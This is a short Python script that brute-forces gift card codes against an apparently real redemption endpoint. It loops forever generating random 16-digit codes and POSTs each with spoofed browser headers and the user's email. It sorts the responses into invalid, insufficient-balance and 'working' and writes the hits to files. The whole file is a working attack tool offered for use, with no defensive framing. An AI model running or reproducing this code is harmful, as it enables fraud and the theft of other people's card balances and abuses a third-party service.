import requests
import random
class Check():


	def __init__(self,userEmail):
		self.userEmail = userEmail


	def randomdigit(self):
		fourdigit = random.randint(1000,9999)
		return str(fourdigit)


	def checker(self):
		email = self.userEmail
		url = "https://www.cysend.com/steam/en/ajax/steam.php"
		headers = {
		"authority": "www.cysend.com","method": "POST",
		"path": "/steam/en/ajax/steam.php","scheme": "https","accept": "application/json, text/javascript, */*; q=0.01","accept-encoding": "gzip, deflate, br","accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
		"content-length": "82","content-type": "application/x-www-form-urlencoded; charset=UTF-8","origin": "https://www.cysend.com","referer": "https://www.cysend.com/","sec-fetch-dest": "empty",
		"sec-fetch-mode": "cors","sec-fetch-site": "same-origin","user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36"
		}
		while True:
			code = str(self.randomdigit() + "-" + self.randomdigit() + "-" + self.randomdigit() + "-" + self.randomdigit())	
			payloadss = "operation=redeem&card_no="+code+"&email="+email+"&=&=Next"
			try:
				myRequest = requests.post(url , data = payloadss , headers = headers)
			except:
				pass
			if(myRequest.status_code == 200):
				if(myRequest.json()["error_desc"] == "Card not found" ):
					messege = "error"
				elif(myRequest.json()["error_desc"] == "Insufficient balance"):
					messege = "Insufficient"
				else:
					messege = "working"
				file = open(messege + ".txt" , "a")
				file.write(code +"     "+ messege+"\n")
				print(code +"     "+ messege )
		file.close()

check = Check(input("Input your Email: "))
check.checker()
